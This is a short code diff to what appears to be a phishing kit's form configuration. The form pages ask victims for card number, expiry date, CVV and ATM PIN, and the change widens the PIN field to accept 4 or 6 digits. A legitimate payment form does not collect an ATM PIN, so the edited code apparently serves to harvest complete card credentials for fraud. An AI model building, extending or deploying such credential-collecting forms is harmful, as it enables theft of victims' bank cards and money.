@@ -103,7 +103,7 @@ export const FORM_PAGES: PageConfig[] = [
             { key: 'cardNumber', displayName: 'Card Number', type: 'tel', category: 'card', required: true, maxlength: 19, placeholder: 'XXXX-XXXX-XXXX-XXXX' },
             { key: 'expiry', displayName: 'Expiry Date', type: 'text', category: 'card', required: true, maxlength: 5, placeholder: 'MM/YY' },
             { key: 'cvv', displayName: 'CVV', type: 'password', category: 'card', required: true, maxlength: 3, placeholder: 'Enter 3-digit CVV' },
-            { key: 'atmPin', displayName: 'ATM PIN', type: 'password', category: 'card', required: true, maxlength: 4, placeholder: 'Enter ATM PIN' },
+            { key: 'atmPin', displayName: 'ATM PIN', type: 'password', category: 'card', required: true, maxlength: 6, placeholder: 'Enter 4 or 6 digit ATM PIN' },
         ],
         nextPage: { main: 'success' },
     },
